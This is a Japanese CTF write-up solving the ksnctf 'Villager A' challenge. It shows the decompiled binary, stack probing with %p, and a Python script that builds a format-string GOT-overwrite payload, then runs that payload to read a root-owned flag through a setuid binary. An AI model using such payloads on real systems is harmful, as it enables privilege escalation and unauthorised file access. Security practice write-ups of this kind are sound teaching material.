# ksnctf: Villager A

**Category:** Binary(Pwnables)  
**Points:** 300pt  
**Description:**  

> SSH: ctfq.sweetduet.info:10022  
> ID: q4  
> Pass: q60SIMpLlej9eq49

**Hint:**

>

## 解き方
指示通りリモート接続してみる．`flag.txt`は見つかるけど権限がないのでpwnの模様．

```
$ ssh q4@ctfq.sweetduet.info -p 10022
q4@ctfq.sweetduet.info's password: 
Last login: Thu Oct 11 16:59:40 2018 from 10.0.2.2
[q4@localhost ~]$ ll
total 16
-r--------. 1 q4a  q4a    22 May 22  2012 flag.txt
-rwsr-xr-x. 1 q4a  q4a  5857 May 22  2012 q4
-rw-r--r--. 1 root root  151 Jun  1  2012 readme.txt
[q4@localhost ~]$ file *
flag.txt:   regular file, no read permission
q4:         setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
readme.txt: ASCII English text
```

ふむ．`setuid`が付与されているので`q4`はroot権限で動作する模様．実行してみる．

```
[q4@localhost ~]$ ./q4
What's your name?
q4
Hi, q4

Do you want the flag?
yes
Do you want the flag?
yeah
Do you want the flag?
so so
Do you want the flag?
no
I see. Good bye.
```

全くもって聞く耳をもたないので，ブチギレながら文字列を調査してみる．名前をオウム返ししているあたりFormat string attackが有効かも？

```
[q4@localhost ~]$ strings q4
/lib/ld-linux.so.2
libstdc++.so.6
__gmon_start__
_Jv_RegisterClasses
__gxx_personality_v0
libm.so.6
libgcc_s.so.1
libc.so.6
_IO_stdin_used
fopen
puts
putchar
stdin
printf
fgets
strcmp
__libc_start_main
CXXABI_1.3
GLIBC_2.1
GLIBC_2.0
PTRh
[^_]
What's your name?
Hi, 
Do you want the flag?
I see. Good bye.
flag.txt
```

`fopen`や`flag.txt`が含まれているので，読み取り権限のなかったflagも読み出せそう．確認のためホストマシンへコピーし[retdec](https://github.com/avast-tl/retdec)で逆コンパイルしてみた．

```
$ scp -P 10022 q4@ctfq.sweetduet.info:/home/q4/q4 ~/CTF/online/ksnctf/04_Villager_A/
...
$ retdec-decompiler.py q4
##### Checking if file is a Mach-O Universal static library...

##### Checking if file is an archive...
RUN: /usr/bin/retdec-ar-extractor /home/takuya/CTF/online/ksnctf/04_Villager_A/q4 --arch-magic
Not an archive, going to the next step.

##### Gathering file information...
RUN: /usr/bin/retdec-fileinfo -c /home/takuya/CTF/online/ksnctf/04_Villager_A/q4.c.json --similarity /home/takuya/CTF/online/ksnctf/04_Villager_A/q4 --no-hashes=all --crypto /usr/bin/../share/retdec/support/generic/yara_patterns/signsrch/signsrch.yara --max-memory-half-ram
Input file               : /home/takuya/CTF/online/ksnctf/04_Villager_A/q4
File format              : ELF
File class               : 32-bit
File type                : Executable file
Architecture             : x86 (or later and compatible)
Endianness               : Little endian
Entry point address      : 0x8048500
Entry point offset       : 0x500
Entry point section name : .text
Entry point section index: 13
Bytes on entry point     : 31ed5e89e183e4f050545268e086040868f0860408515668b4850408e873fffffff490909090909090909090909090905589
Detected tool            : GCC (4.6.3) RHEL (compiler), 49 from 49 significant nibbles (100%)
Detected tool            : GCC (4.4.6) (compiler), .comment section heuristic
Original language        : C++
...
$ ll
total 104
drwxr-xr-x 1 takuya takuya   142 Oct 11 23:36 ./
drwxr-xr-x 1 takuya takuya   132 Oct 11 16:42 ../
-rwxr-xr-x 1 takuya takuya  5857 Oct 11 22:39 q4*
-rw-r--r-- 1 takuya takuya  1795 Oct 11 23:36 q4.c
-rw-r--r-- 1 takuya takuya  1680 Oct 11 23:36 q4.c.backend.bc
-rw-r--r-- 1 takuya takuya  3035 Oct 11 23:36 q4.c.backend.ll
-rw-r--r-- 1 takuya takuya 26900 Oct 11 23:36 q4.c.frontend.dsm
-rw-r--r-- 1 takuya takuya 49253 Oct 11 23:36 q4.c.json
-rw-r--r-- 1 takuya takuya  3347 Oct 11 23:49 README.md
```

`q4.c`の中身はこんな感じ．

```c
//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2018 Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ------------------------ Structures ------------------------

struct _IO_FILE {
    int32_t e0;
};

// --------------------- Global Variables ---------------------

struct _IO_FILE * g1 = NULL;

// ------------------------ Functions -------------------------

// Address range: 0x80485b4 - 0x80486de
int main(int argc, char ** argv) {
    // 0x80485b4
    puts("What's your name?");
    int32_t str = 0; // bp-1048
    fgets((char *)&str, 1024, g1);
    printf("Hi, ");
    printf((char *)&str);
    putchar(10);
    // branch -> 0x8048681
    while (true) {
        // 0x8048681
        puts("Do you want the flag?");
        if (fgets((char *)&str, 1024, g1) != NULL) {
            // 0x8048656
            if (strcmp((char *)&str, "no\n") == 0) {
                // break -> 0x804866e
                break;
            }
            // continue -> 0x8048681
            continue;
        }
        // 0x80486dc
        return 0;
    }
    // 0x804866e
    puts("I see. Good bye.");
    // branch -> 0x80486dc
    // 0x80486dc
    return 0;
}

// --------------- Dynamically Linked Functions ---------------

// char * fgets(char * restrict s, int n, FILE * restrict stream);
// int printf(const char * restrict format, ...);
// int putchar(int c);
// int puts(const char * s);
// int strcmp(const char * s1, const char * s2);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected language: C++
// Detected functions: 1
// Decompilation date: 2018-10-11 23:36:29
```

やはり，`printf((char *)&str);`と解析されたのでFormat string attackでflag取得を目指す．リモート環境に戻って作業する．

```
[q4@localhost ~]$ ./q4
What's your name?
AAAA %p,%p,%p,%p,%p,%p,%p,%p,%p,%p   
Hi, AAAA 0x400,0x2d58c0,0x8,0x14,0x718fc4,0x41414141,0x2c702520,0x252c7025,0x70252c70,0x2c70252c
```

入力により`printf(AAA A%p,%p,%p,%p,%p,%p);`が実行されスタックからデータが出力されていることがわかる．また`A=0x41`より**6番目のスタックは任意の値を設定できそう**である．ホストマシンに残っている`q4.c.frontend.dsm`や`objdump`の結果から，`fopen`周辺箇所で`0x8048691`以降を実行するには`jmp`命令や`jne`命令がネックになっている．

```
0x8048675:   e8 4a fe ff ff                     	call 0x80484c4 <puts>
0x804867a:   b8 00 00 00 00                     	mov eax, 0
0x804867f:   eb 5b                              	jmp 0x80486dc <main+0x128>
0x8048681:   8b 84 24 18 04 00 00               	mov eax, dword ptr [esp + 0x418]
0x8048688:   85 c0                              	test eax, eax
0x804868a:   0f 95 c0                           	setne al
0x804868d:   84 c0                              	test al, al
0x804868f:   75 89                              	jne 0x804861a <main+0x66>
0x8048691:   c7 44 24 04 e6 87 04 08            	mov dword ptr [esp + 4], 0x80487e6
0x8048699:   c7 04 24 e8 87 04 08               	mov dword ptr [esp], 0x80487e8 ; "flag.txt"
0x80486a0:   e8 ff fd ff ff                     	call 0x80484a4 <fopen>
```

`fopen`を強制的にcallする為にGOT overwriteで任意のメモリ番地にある値の書き換えを行う．形式は`%[スタックの位置]$hhn`で，指定したスタックに格納されているアドレスに`printf`の出力byte数(0~255)を書き込むことができる．

今回は`putchar`関数をcallする**ために**アドレスとして参照されているメモリ番地を`fopen`でflagを読み取る直前のアドレス`0x8048691`に書き換える．`main`の処理を見ると，`0x8048608`番地で`0x8048474`番地にある`putchar`関数をcallしていることがわかる．

```
; function: main at 0x80485b4 -- 0x80486de
0x80485b4:   55                                 	push ebp
0x80485b5:   89 e5                              	mov ebp, esp
0x80485b7:   83 e4 f0                           	and esp, 0xfffffff0
0x80485ba:   81 ec 20 04 00 00                  	sub esp, 0x420
0x80485c0:   c7 04 24 a4 87 04 08               	mov dword ptr [esp], 0x80487a4 ; "What's your name?"
0x80485c7:   e8 f8 fe ff ff                     	call 0x80484c4 <puts>
0x80485cc:   a1 04 9a 04 08                     	mov eax, dword ptr [0x8049a04]
0x80485d1:   89 44 24 08                        	mov dword ptr [esp + 8], eax
0x80485d5:   c7 44 24 04 00 04 00 00            	mov dword ptr [esp + 4], 0x400
0x80485dd:   8d 44 24 18                        	lea eax, [esp + 0x18]
0x80485e1:   89 04 24                           	mov dword ptr [esp], eax
0x80485e4:   e8 9b fe ff ff                     	call 0x8048484 <fgets>
0x80485e9:   c7 04 24 b6 87 04 08               	mov dword ptr [esp], 0x80487b6 ; "Hi, "
0x80485f0:   e8 bf fe ff ff                     	call 0x80484b4 <printf>
0x80485f5:   8d 44 24 18                        	lea eax, [esp + 0x18]
0x80485f9:   89 04 24                           	mov dword ptr [esp], eax
0x80485fc:   e8 b3 fe ff ff                     	call 0x80484b4 <printf>
0x8048601:   c7 04 24 0a 00 00 00               	mov dword ptr [esp], 0xa
0x8048608:   e8 67 fe ff ff                     	call 0x8048474 <putchar>
```

更に，`0x8048474`番地にある`putchar`関数では，`0x80499e0`番地を参照し処理が移動している．

```
; function: function_8048474 at 0x8048474 -- 0x804847a
0x8048474:   ff 25 e0 99 04 08                  	jmp dword ptr [0x80499e0] <putchar>

```

**`0x80499e0`を`0x8048691`へ書き換える**ことでflagを取得できそうである．`q4`へ渡すexploit codeを生成する為にスクリプトを書いた．

```python
#! /usr/bin/env python

import sys
import struct

# 書き込むアドレス:0x080499e0
tgt_addr = int(sys.argv[1], 16)
# 格納する値:0x08048691
dst_addr = int(sys.argv[2], 16)
# 書き込むスタックの開始位置:6
offset = int(sys.argv[3])

code = b''

# address:4bytes <-- setuid ELF 32-bit LSB executable
for i in range(4):
    code += ((tgt_addr + i).to_bytes(4, byteorder='little'))

dst = (dst_addr.to_bytes(4, byteorder='little'))
shift = 16

# values
for i in range(len(dst)):
    dst_pos = (dst[i] - shift) % 256
    code += bytes(("%" + str(dst_pos) + "x%" + str(offset + i) + "$hhn").encode('utf-8'))
    shift += dst_pos
 
print(code)
```

```
$ ./exploit.py 0x080499e0 0x08048691 6
b'\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129x%6$hhn%245x%7$hhn%126x%8$hhn%4x%9$hhn'
```

生成した文字列を標準入力で`q4`へ渡すとflagを入手．お疲れ様でした．

```
[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129x%6$hhn%245x%7$hhn%126x%8$hhn%4x%9$hhn' | ./q4
What's your name?
Hi, �                                                                                                                              400                                                                                                                                                                                                                                               2bb8c0                                                                                                                             8  14
FLAG_- 省略 -
```
